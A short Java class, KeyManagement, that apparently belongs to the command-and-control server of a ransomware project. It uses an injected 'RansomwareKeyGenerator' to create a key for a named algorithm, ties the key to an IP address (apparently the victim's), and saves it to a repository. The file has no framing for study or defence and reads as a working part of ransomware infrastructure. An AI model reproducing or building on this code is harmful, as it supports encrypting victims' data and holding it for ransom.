package server.keys;

import java.security.NoSuchAlgorithmException;

import javax.inject.Inject;

import server.repositories.KeyRepository;
import server.entities.CryptoKey;
import server.exceptions.AlgorithmNotFoundException;

public class KeyManagement {
	@Inject
	private KeyRepository repository;
	@Inject
	private RansomwareKeyGenerator generator;

	public CryptoKey createAndSaveKey(String encalgo, String ip)
			throws AlgorithmNotFoundException, NoSuchAlgorithmException {

		return (repository.save(new CryptoKey(ip, generator.generateKey(encalgo), encalgo))); // Save to DB

	}
}
